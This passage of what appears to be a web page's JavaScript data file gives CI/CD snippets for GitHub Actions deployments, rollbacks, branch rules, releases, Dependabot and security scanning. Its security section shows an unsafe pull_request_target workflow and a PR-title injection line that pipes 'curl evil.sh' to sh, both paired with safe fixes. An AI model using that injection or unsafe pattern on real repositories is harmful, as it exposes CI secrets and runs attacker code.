            gcloud iam service-accounts add-iam-policy-binding "$PROJECT_NUMBER-compute@developer.gserviceaccount.com" --project=$PROJECT_ID --member="serviceAccount:$SA" --role="roles/iam.serviceAccountUser"

            # allow workflows from this repo to act as the service account
            gcloud iam service-accounts add-iam-policy-binding $SA --project=$PROJECT_ID --role="roles/iam.workloadIdentityUser" --member="principalSet://iam.googleapis.com/projects/$PROJECT_NUMBER/locations/global/workloadIdentityPools/github/attribute.repository/$REPO"

            # full provider name for the workflow
            gcloud iam workload-identity-pools providers describe your-app --project=$PROJECT_ID --location=global --workload-identity-pool=github --format="value(name)"
            `,
          note: 'run.developer can deploy services but not change who may call them; use run.admin only if the deploy must set IAM, such as allowing public access. serviceAccountUser on the runtime service account (here the default compute account) is needed for Cloud Run deploys.',
        },
        {
          title: '4. Authenticate in the workflow',
          lang: 'yaml',
          code: c`
            jobs:
              deploy:
                runs-on: ubuntu-latest
                environment: production
                permissions:
                  contents: read
                  id-token: write
                steps:
                  - uses: actions/checkout@v4
                  - uses: google-github-actions/auth@v2
                    with:
                      workload_identity_provider: projects/123456789012/locations/global/workloadIdentityPools/github/providers/your-app
                      service_account: github-deploy@your-project.iam.gserviceaccount.com
                  - uses: google-github-actions/setup-gcloud@v2
                  - run: gcloud auth list
            `,
          note: 'auth@v2 swaps the GitHub OIDC token for short-lived Google credentials and exports them for gcloud, client libraries and firebase-tools. Nothing is stored in secrets. Keep checkout before auth, because checkout cleans the workspace where the credentials file is written.',
        },
        {
          title: 'Cloud Run from an Artifact Registry image',
          lang: 'yaml',
          code: c`
                env:
                  IMAGE: europe-west1-docker.pkg.dev/your-project/apps/your-app:${GH} github.sha }}
                steps:
                  # ...checkout, auth, setup-gcloud from step 4...
                  - run: gcloud auth configure-docker europe-west1-docker.pkg.dev --quiet
                  - run: docker build -t "$IMAGE" . && docker push "$IMAGE"
                  - id: deploy
                    uses: google-github-actions/deploy-cloudrun@v2
                    with:
                      service: your-app
                      region: europe-west1
                      image: ${GH} env.IMAGE }}
                  - name: Smoke test
                    env:
                      URL: ${GH} steps.deploy.outputs.url }}
                    run: curl --fail --silent --show-error --retry 5 --retry-all-errors "$URL/health"
            `,
          note: 'These keys go in the deploy job from step 4. The smoke test assumes the service allows public access. Cloud Run keeps every revision, so a rollback is sending traffic back to the previous one.',
          then: [
            {
              label: 'Create the Docker repository once (bash / zsh / PowerShell)',
              lang: 'bash',
              code: c`
                gcloud artifacts repositories create apps --project=$PROJECT_ID --repository-format=docker --location=europe-west1
                `,
            },
            {
              label: 'Roll back to an earlier revision (same on every OS)',
              lang: 'bash',
              code: c`
                gcloud run revisions list --service=your-app --region=europe-west1
                gcloud run services update-traffic your-app --region=europe-west1 --to-revisions=your-app-00041-abc=100
                `,
            },
          ],
        },
        {
          title: 'Firebase Hosting',
          lang: 'yaml',
          code: c`
                  # ...checkout and auth from step 4...
                  - uses: actions/setup-node@v4
                    with:
                      node-version: 24
                      cache: npm
                  - run: npm ci && npm run build
                  - run: npx --yes firebase-tools deploy --only hosting --project your-project --non-interactive
            `,
          note: 'firebase-tools picks up the credentials written by auth@v2, so no FIREBASE_TOKEN is needed. Grant the service account Firebase Hosting Admin, as shown in the follow-up block.',
          then: [
            {
              label: 'Grant the role (bash / zsh / PowerShell)',
              lang: 'bash',
              code: c`
                gcloud projects add-iam-policy-binding $PROJECT_ID --member="serviceAccount:$SA" --role="roles/firebasehosting.admin"
                `,
            },
          ],
        },
      ],
    },
    {
      id: 'cd-static',
      title: 'Static hosts: Netlify, Vercel, GitHub Pages',
      group: 'Deployment (CD)',
      items: [
        {
          title: 'Store host tokens as secrets',
          lang: 'bash',
          code: c`
            # same on every OS; each command prompts for the value
            gh secret set NETLIFY_AUTH_TOKEN
            gh secret set NETLIFY_SITE_ID
            gh secret set VERCEL_TOKEN
            gh secret set VERCEL_ORG_ID
            gh secret set VERCEL_PROJECT_ID
            `,
          note: 'Create the tokens in each host\'s account settings. Typing the value at the prompt keeps it out of your shell history.',
        },
        {
          title: 'Netlify CLI',
          lang: 'yaml',
          code: c`
                  - uses: actions/checkout@v4
                  - uses: actions/setup-node@v4
                    with:
                      node-version: 24
                      cache: npm
                  - run: npm ci && npm run build
                  - name: Deploy to Netlify
                    env:
                      NETLIFY_AUTH_TOKEN: ${GH} secrets.NETLIFY_AUTH_TOKEN }}
                      NETLIFY_SITE_ID: ${GH} secrets.NETLIFY_SITE_ID }}
                    run: npx --yes netlify-cli deploy --dir=dist --no-build --prod
            `,
          note: 'Leave out --prod for a draft deploy with its own preview URL, which suits pull requests from branches in the same repo; forks get no secrets, and pull_request_target is not a safe workaround. Turn off Netlify\'s own Git builds so each commit is not deployed twice.',
        },
        {
          title: 'Vercel CLI',
          lang: 'yaml',
          code: c`
                env:
                  VERCEL_ORG_ID: ${GH} secrets.VERCEL_ORG_ID }}
                  VERCEL_PROJECT_ID: ${GH} secrets.VERCEL_PROJECT_ID }}
                steps:
                  - uses: actions/checkout@v4
                  - uses: actions/setup-node@v4
                    with:
                      node-version: 24
                  - run: npm install --global vercel@latest
                  - run: vercel pull --yes --environment=production --token="$VERCEL_TOKEN"
                    env:
                      VERCEL_TOKEN: ${GH} secrets.VERCEL_TOKEN }}
                  - run: vercel build --prod --token="$VERCEL_TOKEN"
                    env:
                      VERCEL_TOKEN: ${GH} secrets.VERCEL_TOKEN }}
                  - run: vercel deploy --prebuilt --prod --token="$VERCEL_TOKEN"
                    env:
                      VERCEL_TOKEN: ${GH} secrets.VERCEL_TOKEN }}
            `,
          note: 'The build runs on the GitHub runner and only the output is uploaded. The token is passed per step so the rest of the job never sees it. The org and project IDs are written to .vercel/project.json when you link the project locally.',
          then: [
            {
              label: 'Get the IDs (same on every OS; cat is an alias of Get-Content in PowerShell)',
              lang: 'bash',
              code: c`
                npx vercel link
                cat .vercel/project.json
                `,
            },
          ],
        },
        {
          title: 'GitHub Pages: enable and set the base path',
          lang: 'bash',
          code: c`
            # same on every OS: publish from GitHub Actions instead of a branch
            gh api -X POST repos/your-org/your-app/pages -f build_type=workflow
            `,
          note: 'A project site is served from /your-app/, so tell the bundler the base path. If the repo already has Pages enabled, change the source under Settings, Pages instead.',
          then: [
            {
              label: 'vite.config.js',
              lang: 'js',
              code: c`
                import { defineConfig } from 'vite'
                import react from '@vitejs/plugin-react'

                export default defineConfig({
                  base: '/your-app/',      // use '/' for your-org.github.io or a custom domain
                  plugins: [react()],
                })
                `,
            },
          ],
        },
        {
          title: 'GitHub Pages workflow',
          lang: 'yaml',
          code: c`
            # .github/workflows/pages.yml
            name: Pages
            on:
              push:
                branches: [main]
              workflow_dispatch:

            permissions:
              contents: read
              pages: write
              id-token: write

            concurrency:
              group: pages
              cancel-in-progress: false

            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - uses: actions/checkout@v4
                  - uses: actions/setup-node@v4
                    with:
                      node-version: 24
                      cache: npm
                  - run: npm ci
                  - run: npm run build
                  - run: cp dist/index.html dist/404.html      # SPA routes survive a refresh
                  - uses: actions/upload-pages-artifact@v3
                    with:
                      path: dist

              deploy:
                needs: build
                runs-on: ubuntu-latest
                environment:
                  name: github-pages
                  url: ${GH} steps.deployment.outputs.page_url }}
                steps:
                  - id: deployment
                    uses: actions/deploy-pages@v4
            `,
          note: 'pages: write and id-token: write let deploy-pages publish without a token secret. The github-pages environment shows the live URL on the run page.',
        },
      ],
    },
    {
      id: 'cd-environments',
      title: 'Environments, approvals & rollback',
      group: 'Deployment (CD)',
      items: [
        {
          title: '1. Create environments with required reviewers',
          lang: 'json',
          code: c`
            {
              "wait_timer": 0,
              "reviewers": [{ "type": "User", "id": 1234567 }],
              "deployment_branch_policy": { "protected_branches": false, "custom_branch_policies": true }
            }
            `,
          note: 'Save as production.json. A job that targets production pauses until a listed reviewer approves it. Required reviewers are free on public repositories; on private ones they need GitHub Enterprise.',
          then: [
            {
              label: 'Apply it and allow only main to deploy (same on every OS)',
              lang: 'bash',
              code: c`
                gh api users/your-github-user --jq .id                 # reviewer id
                gh api -X PUT repos/your-org/your-app/environments/staging
                gh api -X PUT repos/your-org/your-app/environments/production --input production.json
                gh api -X POST repos/your-org/your-app/environments/production/deployment-branch-policies -f name=main
                `,
            },
          ],
        },
        {
          title: '2. Staging, then production',
          lang: 'yaml',
          code: c`
            # .github/workflows/ci.yml
            name: CI/CD
            on:
              push:
                branches: [main]
              pull_request:

            permissions:
              contents: read

            jobs:
              test:
                runs-on: ubuntu-latest
                steps:
                  - uses: actions/checkout@v4
                  - run: ./run-tests.sh

              staging:
                needs: test
                if: github.event_name == 'push' && github.ref == 'refs/heads/main'
                uses: ./.github/workflows/deploy.yml
                with:
                  environment: staging
                  url: https://staging.example.com
                secrets: inherit

              production:
                needs: staging
                uses: ./.github/workflows/deploy.yml
                with:
                  environment: production
                  url: https://example.com
                secrets: inherit
            `,
          note: 'The same deploy steps run twice with different environments, so production gets exactly what was tested on staging. Each environment has its own DEPLOY_HOST and other secrets, and the production job waits for approval.',
          then: [
            {
              label: '.github/workflows/deploy.yml (reusable)',
              lang: 'yaml',
              code: c`
                name: Deploy
                on:
                  workflow_call:
                    inputs:
                      environment: { type: string, required: true }
                      url: { type: string, required: true }

                jobs:
                  deploy:
                    runs-on: ubuntu-latest
                    environment:
                      name: ${GH} inputs.environment }}
                      url: ${GH} inputs.url }}
                    concurrency:
                      group: deploy-${GH} inputs.environment }}
                      cancel-in-progress: false
                    steps:
                      - uses: actions/checkout@v4
                      # ...Configure SSH, run deploy.sh, smoke test...
                `,
            },
          ],
        },
        {
          title: '3. Manual deploy of any branch, tag or commit',
          lang: 'yaml',
          code: c`
            # .github/workflows/deploy-manual.yml
            name: Deploy (manual)
            on:
              workflow_dispatch:
                inputs:
                  ref:
                    description: 'Branch, tag or commit SHA'
                    required: true
                    default: main
                  environment:
                    type: choice
                    options: [staging, production]
                    default: staging

            permissions:
              contents: read

            jobs:
              deploy:
                runs-on: ubuntu-latest
                environment: ${GH} inputs.environment }}
                concurrency:
                  group: deploy-${GH} inputs.environment }}
                  cancel-in-progress: false
                steps:
                  - uses: actions/checkout@v4
                    with:
                      ref: ${GH} inputs.ref }}
                  # ...Configure SSH step...
                  - env:
                      HOST: ${GH} secrets.DEPLOY_HOST }}
                    run: ssh -i ~/.ssh/deploy_key deploy@"$HOST" "cd /var/www/app && ./deploy.sh $(git rev-parse HEAD)"
            `,
          note: 'The ref is resolved to an exact commit on the runner and passed to deploy.sh. The environment\'s branch rule checks the branch the workflow runs from (main by default), not the ref input, so required reviewers are the real gate for production.',
          then: [
            {
              label: 'Start it from the terminal (same on every OS)',
              lang: 'bash',
              code: c`
                gh workflow run deploy-manual.yml -f ref=v1.4.2 -f environment=production
                gh run watch
                `,
            },
          ],
        },
        {
          title: 'Roll back with git revert',
          lang: 'bash',
          code: c`
            # same on every OS
            git revert --no-edit 3f2c1e9          # undo one commit with a new commit
            git revert --no-edit -m 1 a1b2c3d     # undo a merged pull request
            git push origin main                  # the normal pipeline deploys the fix
            `,
          note: 'History stays intact and the rollback goes through tests and approvals like any change. Use this when the pipeline is fast enough. If main is protected, push a branch and merge the revert through a pull request instead.',
        },
        {
          title: 'Roll back by redeploying a previous tag',
          lang: 'bash',
          code: c`
            # same on every OS
            gh release list --limit 5
            gh workflow run deploy-manual.yml -f ref=v1.4.1 -f environment=production
            `,
          note: 'Faster than a revert because the old version was already built and tested. Fix forward on main afterwards, or the next push redeploys the bad code. For Docker, redeploy the previous image tag instead.',
        },
        {
          title: 'Migrations that survive a rollback (expand / contract)',
          lang: 'text',
          code: c`
            Example: rename users.name to users.full_name with no downtime

            Release 1  expand    add full_name (nullable); code writes both columns, reads name
                       backfill  UPDATE users SET full_name = name WHERE full_name IS NULL  (in batches)
            Release 2            code reads full_name, still writes both
            Release 3  contract  code stops writing name; a later migration drops name

            Rules
            - every release must work with both the old and the new schema
            - add columns as nullable or with a default; never rename or drop in the same release
            - run migrations before the new code starts, and never in a down/rollback step
            `,
          note: 'Code rollbacks are instant but schema rollbacks are not. If each release stays compatible with the previous schema, you can roll back code without touching the database.',
          then: [
            {
              label: 'Online-safe DDL',
              lang: 'text',
              code: c`
                -- Postgres 17: build indexes without locking writes (not inside a transaction)
                CREATE INDEX CONCURRENTLY idx_users_full_name ON users (full_name);

                -- MySQL 8.4: instant column add, online index build
                ALTER TABLE users ADD COLUMN full_name VARCHAR(255) NULL, ALGORITHM=INSTANT;
                ALTER TABLE users ADD INDEX idx_users_full_name (full_name), ALGORITHM=INPLACE, LOCK=NONE;
                `,
            },
          ],
        },
      ],
    },
    {
      id: 'rel-protect-main',
      title: 'Protect main',
      group: 'Releases & quality',
      items: [
        {
          title: '1. Create a ruleset for main',
          lang: 'text',
          code: c`
            Repository → Settings → Rules → Rulesets → New ruleset → New branch ruleset

            Ruleset name:        protect-main
            Enforcement status:  Active
            Bypass list:         (empty, or a release-manager team only)
            Target branches:     Add target → Include default branch

            Branch rules to tick:
              [x] Restrict deletions
              [x] Block force pushes
              [x] Require linear history
              [x] Require a pull request before merging
              [x] Require status checks to pass
            → Create
            `,
          note: 'Rulesets replace the older "Branch protection rules" page and can target several branches at once. Both still work; use one or the other for a given branch to avoid confusing overlaps.',
        },
        {
          title: '2. Required status checks',
          lang: 'yaml',
          code: c`
            # .github/workflows/ci.yml — each job's name becomes a check name
            name: CI
            on:
              pull_request:
              push:
                branches: [main]

            permissions:
              contents: read

            jobs:
              lint:
                name: lint
                runs-on: ubuntu-latest
                steps:
                  - uses: actions/checkout@v4
                  - uses: actions/setup-node@v4
                    with:
                      node-version: 24
                      cache: npm
                  - run: npm ci
                  - run: npm run lint
              test:
                name: test
                runs-on: ubuntu-latest
                steps:
                  - uses: actions/checkout@v4
                  - uses: actions/setup-node@v4
                    with:
                      node-version: 24
                      cache: npm
                  - run: npm ci
                  - run: npm test
            `,
          note: 'In the ruleset, under "Require status checks to pass", add lint and test. A check only shows up in the picker after it has run at least once, so push the workflow first. Matrix jobs appear as one check per combination, e.g. "test (24)".',
          then: [
            {
              label: 'Ruleset options worth enabling',
              lang: 'text',
              code: c`
                Require status checks to pass
                  [x] Require branches to be up to date before merging
                  Add checks: lint, test
                `,
            },
          ],
        },
        {
          title: '3. Required reviews and linear history',
          lang: 'text',
          code: c`
            Require a pull request before merging
              Required approvals:                          1
              [x] Dismiss stale pull request approvals when new commits are pushed
              [x] Require review from Code Owners
              [x] Require approval of the most recent reviewable push
              [x] Require conversation resolution before merging

            Require linear history
              → also set Settings → General → Pull Requests:
                [x] Allow squash merging   [ ] Allow merge commits   [x] Allow rebase merging
            `,
          note: 'Linear history blocks merge commits on main, so every PR lands as a squash or rebase. Turn off merge commits in the repository settings too, or the merge button will offer an option the rule then rejects.',
        },
        {
          title: 'CODEOWNERS file',
          lang: 'text',
          code: c`
            # .github/CODEOWNERS — last matching pattern wins
            *                       @your-org/maintainers
            /src/api/               @your-org/backend
            /src/components/        @your-org/frontend
            /.github/               @your-org/platform
            /database/migrations/   @your-org/backend @your-org/dba
            Dockerfile              @your-org/platform
            `,
          note: 'With "Require review from Code Owners" on, a PR needs approval from an owner of every path it touches. Owners must have write access to the repository, and teams must be visible to it. Owning /.github/ stops anyone from quietly changing workflows.',
        },
        {
          title: 'Same protection with gh api (optional)',
          lang: 'bash',
          code: c`
            # same on every OS — classic branch protection via the REST API
            gh api -X PUT repos/your-org/your-app/branches/main/protection --input protection.json

            # check the result
            gh api repos/your-org/your-app/branches/main/protection
            `,
          note: 'This sets classic branch protection, not a ruleset, so use it instead of the ruleset above rather than alongside it. Useful for applying the same settings to many repositories from a script; needs admin rights on the repository.',
          then: [
            {
              label: 'protection.json',
              lang: 'json',
              code: c`
                {
                  "required_status_checks": {
                    "strict": true,
                    "checks": [{ "context": "lint" }, { "context": "test" }]
                  },
                  "enforce_admins": true,
                  "required_pull_request_reviews": {
                    "required_approving_review_count": 1,
                    "dismiss_stale_reviews": true,
                    "require_code_owner_reviews": true,
                    "require_last_push_approval": true
                  },
                  "restrictions": null,
                  "required_linear_history": true,
                  "allow_force_pushes": false,
                  "allow_deletions": false,
                  "required_conversation_resolution": true
                }
                `,
            },
          ],
        },
      ],
    },
    {
      id: 'rel-versioning',
      title: 'Versioning & releases',
      group: 'Releases & quality',
      items: [
        {
          title: 'Semantic versioning',
          lang: 'text',
          code: c`
            MAJOR.MINOR.PATCH        e.g. 1.4.0

            1.4.0 → 2.0.0   MAJOR   breaking change (removed endpoint, renamed option)
            1.4.0 → 1.5.0   MINOR   new feature, backwards compatible
            1.4.0 → 1.4.1   PATCH   bug fix only

            2.0.0-rc.1      pre-release (sorts before 2.0.0)
            0.x.y           initial development: anything may change
            `,
          note: 'Tags are usually the version with a v prefix (v1.4.0). Consumers rely on the rules: a caret range like ^1.4.0 accepts any 1.x release from 1.4.0 up, so a breaking change shipped as a minor release breaks their builds.',
        },
        {
          title: 'Conventional Commits',
          lang: 'text',
          code: c`
            feat: add CSV export to reports              → MINOR
            fix(auth): refresh token before it expires   → PATCH
            docs: explain the deploy workflow            → no release
            chore(deps): bump axios to 1.7.9             → no release
            refactor!: drop Node 20 support              → MAJOR (the ! marks a breaking change)

            feat(api): return totals in /orders

            BREAKING CHANGE: "total" is now an object, not a number.   → MAJOR
            `,
          note: 'Format is type(optional scope): summary, with an optional body and footer. Tools such as release-please and semantic-release read these messages to pick the next version and write the changelog. With squash merging, the PR title becomes the commit message, so lint the title.',
        },
        {
          title: '1. Bump the version',
          lang: 'bash',
          code: c`
            # Node — same on every OS; edits package.json, commits and creates tag v1.4.0
            npm version minor -m "chore(release): %s"
            # or: npm version patch
            # or: npm version 2.0.0-rc.1

            # PHP — Composer has no version command; the git tag is the version
            # (leave "version" out of composer.json and go straight to step 2)

            # Python — set version = "1.4.0" in pyproject.toml, or let the tool do it
            poetry version minor
            hatch version minor
            `,
          note: 'npm version refuses to run with uncommitted changes. It creates an annotated tag itself, so skip the manual tag in step 2 and only push. For PHP and Python, commit the change and then tag as in step 2.',
          then: [
            {
              label: 'Push the commit and the tag npm created',
              lang: 'bash',
              code: c`
                # same on every OS
                git push --follow-tags
                `,
            },
          ],
        },
        {
          title: '2. Tag and push',
          lang: 'bash',
          code: c`
            # same on every OS
            git switch main
            git pull
            git tag -a v1.4.0 -m "Release 1.4.0"
            git push origin v1.4.0

            # list the 10 newest tags (same on every OS)
            git for-each-ref refs/tags --sort=-v:refname --count=10 --format="%(refname:short)"
            `,
          note: 'Annotated tags (-a) store the tagger and date and are what git describe and most release tools expect. Pushing the tag is what triggers the release workflow.',
          then: [
            {
              label: 'Delete a wrong tag (before anyone uses it)',
              lang: 'bash',
              code: c`
                # same on every OS
                git tag -d v1.4.0
                git push origin --delete v1.4.0
                `,
            },
          ],
        },
        {
          title: '3. Release workflow on tag push',
          lang: 'yaml',
          code: c`
            # .github/workflows/release.yml
            name: Release
            on:
              push:
                tags: ['v*']

            permissions:
              contents: read

            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - uses: actions/checkout@v4
                  - uses: actions/setup-node@v4
                    with:
                      node-version: 24
                      cache: npm
                  - run: npm ci
                  - run: npm test
                  - run: npm run build
                  - run: tar -czf "app-$GITHUB_REF_NAME.tar.gz" dist
                  - uses: actions/upload-artifact@v4
                    with:
                      name: release-files
                      path: app-*.tar.gz

              release:
                needs: build
                runs-on: ubuntu-latest
                permissions:
                  contents: write
                steps:
                  - uses: actions/download-artifact@v4
                    with:
                      name: release-files
                  - uses: softprops/action-gh-release@v2
                    with:
                      generate_release_notes: true
                      files: app-*.tar.gz
                      prerelease: ${GH} contains(github.ref_name, '-') }}
            `,
          note: 'Only the release job gets contents: write, so npm install scripts and the build never run with a write token. generate_release_notes lists merged PRs and contributors since the previous tag; tags with a hyphen (v2.0.0-rc.1) are marked as pre-releases. Add a tag ruleset for v* so only maintainers can create release tags.',
          then: [
            {
              label: 'Group the generated notes — .github/release.yml',
              lang: 'yaml',
              code: c`
                changelog:
                  exclude:
                    labels: [skip-changelog]
                  categories:
                    - title: Breaking changes
                      labels: [breaking]
                    - title: Features
                      labels: [feature, enhancement]
                    - title: Fixes
                      labels: [bug, fix]
                    - title: Dependencies
                      labels: [dependencies]
                    - title: Other
                      labels: ['*']
                `,
            },
          ],
        },
      ],
    },
    {
      id: 'rel-dependabot',
      title: 'Keep dependencies updated',
      group: 'Releases & quality',
      items: [
        {
          title: '1. Add .github/dependabot.yml',
          lang: 'yaml',
          code: c`
            version: 2
            updates:
              - package-ecosystem: github-actions
                directory: /
                schedule:
                  interval: weekly
                groups:
                  actions:
                    patterns: ['*']

              - package-ecosystem: npm
                directory: /
                schedule:
                  interval: weekly
                  day: monday
                  time: '06:00'
                  timezone: Europe/London
                open-pull-requests-limit: 10
                commit-message:
                  prefix: chore
                  include: scope
                groups:
                  patch-updates:
                    patterns: ['*']
                    update-types: [patch]
                  dev-dependencies:
                    dependency-type: development
                    update-types: [minor]

              - package-ecosystem: composer
                directory: /
                schedule:
                  interval: weekly
                groups:
                  patch-updates:
                    patterns: ['*']
                    update-types: [patch]

              - package-ecosystem: pip
                directory: /
                schedule:
                  interval: weekly
                groups:
                  patch-updates:
                    patterns: ['*']
                    update-types: [patch]

              - package-ecosystem: docker
                directory: /
                schedule:
                  interval: monthly
            `,
          note: 'Keep only the ecosystems your repository uses. Groups turn many small PRs into one per group; anything not matched by a group (here, minor production updates and all majors) still gets its own PR. Dependabot adds the dependencies label to its PRs by default.',
        },
        {
          title: '2. Ignore majors for a package',
          lang: 'yaml',
          code: c`
            # .github/dependabot.yml — add ignore to the matching entry
            updates:
              - package-ecosystem: npm
                directory: /
                schedule:
                  interval: weekly
                ignore:
                  - dependency-name: 'react'
                    update-types: ['version-update:semver-major']
                  - dependency-name: '@types/node'
                    versions: ['>=25']
            `,
          note: 'Use this for upgrades you plan to do by hand, such as a framework major. Keep an eye on Dependabot alerts for ignored packages.',
        },
        {
          title: '3. Turn on security updates and auto-merge',
          lang: 'text',
          code: c`
            Settings → Advanced Security (or Code security)
              Dependabot alerts            Enable
              Dependabot security updates  Enable

            Settings → General → Pull Requests
              [x] Allow auto-merge
            `,
          note: 'Auto-merge only waits for what branch protection or the ruleset requires, so set up required status checks first. Without them there is nothing to wait for and a PR can merge before CI has run.',
        },
        {
          title: '4. Auto-merge patch updates',
          lang: 'yaml',
          code: c`
            # .github/workflows/dependabot-automerge.yml
            name: Dependabot auto-merge
            on: pull_request

            permissions:
              contents: write
              pull-requests: write

            jobs:
              automerge:
                if: github.event.pull_request.user.login == 'dependabot[bot]'
                runs-on: ubuntu-latest
                steps:
                  - name: Enable auto-merge for patch updates
                    env:
                      GH_TOKEN: ${GH} secrets.GITHUB_TOKEN }}
                      PR_URL: ${GH} github.event.pull_request.html_url }}
                      PR_TITLE: ${GH} github.event.pull_request.title }}
                    run: |
                      FROM=$(echo "$PR_TITLE" | sed -nE 's/.* from ([0-9]+\.[0-9]+)\.[0-9]+ to .*/\1/p')
                      TO=$(echo "$PR_TITLE" | sed -nE 's/.* to ([0-9]+\.[0-9]+)\.[0-9]+.*/\1/p')
                      PATCH=no
                      case "$PR_TITLE" in
                        *"the patch-updates group"*) PATCH=yes ;;
                        *) if [ -n "$FROM" ] && [ "$FROM" = "$TO" ]; then PATCH=yes; fi ;;
                      esac
                      if [ "$PATCH" = "yes" ]; then
                        gh pr merge --auto --squash "$PR_URL"
                      fi
            `,
          note: 'A single-package PR counts as a patch when the major.minor part of its "from" and "to" versions match; grouped PRs are matched by the patch-updates group name from dependabot.yml. The PR still merges only after the required checks pass, and if the ruleset requires an approval a person still has to approve it.',
        },
      ],
    },
    {
      id: 'rel-security',
      title: 'Security scanning',
      group: 'Releases & quality',
      items: [
        {
          title: 'CodeQL workflow',
          lang: 'yaml',
          code: c`
            # .github/workflows/codeql.yml
            name: CodeQL
            on:
              push:
                branches: [main]
              pull_request:
                branches: [main]
              schedule:
                - cron: '30 3 * * 1'

            permissions:
              contents: read
              security-events: write
              actions: read

            jobs:
              analyze:
                runs-on: ubuntu-latest
                strategy:
                  fail-fast: false
                  matrix:
                    language: [javascript-typescript, python]
                steps:
                  - uses: actions/checkout@v4
                  - uses: github/codeql-action/init@v3
                    with:
                      languages: ${GH} matrix.language }}
                      build-mode: none
                  - uses: github/codeql-action/analyze@v3
                    with:
                      category: /language:${GH} matrix.language }}
            `,
          note: 'Results appear under Security → Code scanning and as annotations on PRs. JavaScript, TypeScript and Python need no build step; PHP is not supported by CodeQL. For a zero-config start, the Default CodeQL setup under Settings → Advanced Security (or Code security) does the same without a workflow file; use one or the other, not both.',
        },
        {
          title: 'Dependency audits in CI',
          lang: 'yaml',
          code: c`
            # Node (after actions/setup-node)
            - run: npm ci
            - run: npm audit --audit-level=high --omit=dev

            # PHP (after shivammathur/setup-php)
            - run: composer install --no-interaction --no-progress --prefer-dist
            - run: composer audit

            # Python (after actions/setup-python)
            - run: pip install pip-audit
            - run: pip-audit -r requirements.txt
            `,
          note: 'Each audit exits non-zero when it finds a vulnerability, which fails the job. --audit-level=high ignores low and moderate advisories; --omit=dev skips packages that never reach production.',
          then: [
            {
              label: 'Run the same audits locally',
              lang: 'bash',
              code: c`
                # same on every OS
                npm audit
                npm audit fix          # applies semver-compatible upgrades only
                composer audit

                # Python: inside the project's activated virtual environment (same on every OS)
                python -m pip install pip-audit
                pip-audit -r requirements.txt
                `,
            },
          ],
        },
        {
          title: 'Secret scanning push protection',
          lang: 'text',
          code: c`
            Settings → Advanced Security (or Code security)
              Secret Protection       Enable
              Push protection         Enable

            Organisation-wide: Organisation → Settings → Advanced Security → Configurations
            `,
          note: 'Push protection rejects a git push that contains a recognised token (AWS keys, Stripe keys, GitHub tokens and many more). Free for public repositories; private ones need GitHub Secret Protection. If a push is blocked, remove the secret from the commit history and rotate it rather than bypassing.',
        },
        {
          title: 'Never echo secrets',
          lang: 'yaml',
          code: c`
            # Bad: the expression is pasted into the script text before it runs
            - run: echo "Using key ${GH} secrets.API_KEY }}"

            # Good: pass through env, never print it
            - run: ./scripts/deploy.sh
              env:
                API_KEY: ${GH} secrets.API_KEY }}

            # Mask a value you derive at runtime before anything can print it
            - run: |
                TOKEN=$(./scripts/get-token.sh)
                echo "::add-mask::$TOKEN"
                echo "TOKEN=$TOKEN" >> "$GITHUB_ENV"
            `,
          note: 'GitHub masks secret values in logs, but not transformed copies such as base64, URL-encoded or split strings. Avoid set -x in steps that use secrets, and remember that secrets are not passed to workflows triggered from forks.',
        },
        {
          title: 'pull_request_target warning',
          lang: 'yaml',
          code: c`
            # DANGEROUS: runs fork code with secrets and a write token
            on: pull_request_target
            jobs:
              test:
                runs-on: ubuntu-latest
                steps:
                  - uses: actions/checkout@v4
                    with:
                      ref: ${GH} github.event.pull_request.head.sha }}
                  - run: npm ci && npm test   # attacker controls package.json
            `,
          note: 'pull_request_target runs in the context of the base repository, with its secrets and a write token, even for PRs from forks. Use plain pull_request to build and test PR code, and keep pull_request_target for jobs that never check out or execute the PR\'s code, such as labelling.',
          then: [
            {
              label: 'Script injection: untrusted text only through env (any trigger)',
              lang: 'yaml',
              code: c`
                # Bad: a PR title like  "; curl evil.sh | sh #  becomes part of the script
                - run: echo "${GH} github.event.pull_request.title }}"

                # Good: the shell sees a variable, not code
                - run: echo "$TITLE"
                  env:
                    TITLE: ${GH} github.event.pull_request.title }}
                `,
            },
            {
              label: 'Safe use of pull_request_target: label without checkout',
              lang: 'yaml',
              code: c`
                on: pull_request_target

                permissions:
                  pull-requests: write

                jobs:
                  label:
                    runs-on: ubuntu-latest
                    steps:
                      - env:
                          GH_TOKEN: ${GH} secrets.GITHUB_TOKEN }}
                          PR_NUMBER: ${GH} github.event.pull_request.number }}
                        run: gh api -X POST "repos/$GITHUB_REPOSITORY/issues/$PR_NUMBER/labels" -f "labels[]=needs-review"
                `,
            },
          ],
        },
      ],
    },
    {
      id: 'rel-coverage',
      title: 'Test reports & coverage',
      group: 'Releases & quality',
      items: [
        {
          title: '1. Produce a coverage report',
          lang: 'bash',
          code: c`
            # same on every OS (except the PHPUnit path)
            # Vitest (needs @vitest/coverage-v8)
            npx vitest run --coverage --coverage.reporter=lcov --coverage.reporter=json-summary

            # Jest
            npx jest --coverage

            # pytest (needs pytest-cov)
            pytest --cov=app --cov-report=xml --junitxml=junit.xml

            # PHPUnit (needs pcov or Xdebug)
            # macOS / Linux
            vendor/bin/phpunit --coverage-clover coverage.xml --log-junit junit.xml
            # Windows (PowerShell)
            .\vendor\bin\phpunit --coverage-clover coverage.xml --log-junit junit.xml
            `,
          note: 'Vitest and Jest write coverage/lcov.info; pytest-cov and PHPUnit write an XML file. Codecov understands all of these formats.',
          then: [
            {
              label: 'Enable a coverage driver for PHP in CI',
              lang: 'yaml',
              code: c`
                - uses: shivammathur/setup-php@v2
                  with:
                    php-version: '8.3'
                    coverage: pcov
                `,
            },
          ],
        },
        {
          title: '2. Upload to Codecov',
          lang: 'yaml',
          code: c`
            - run: npx vitest run --coverage --coverage.reporter=lcov --coverage.reporter=json-summary

            - uses: codecov/codecov-action@v5
              with:
                token: ${GH} secrets.CODECOV_TOKEN }}
                files: ./coverage/lcov.info
                flags: frontend
                fail_ci_if_error: true
            `,
          note: 'Copy the upload token from the repository\'s configuration page on codecov.io and save it as the CODECOV_TOKEN repository secret. flags let you track backend and frontend coverage separately in one repository.',
          then: [
            {
              label: 'Save the token as a secret',
              lang: 'bash',
              code: c`
                # same on every OS (prompts for the value)
                gh secret set CODECOV_TOKEN --repo your-org/your-app
                `,
            },
          ],
        },
        {
          title: 'Keep the HTML report as an artifact',
          lang: 'yaml',
          code: c`
            - uses: actions/upload-artifact@v4
              if: always()
              with:
                name: coverage-report
                path: coverage/
                retention-days: 14
            `,
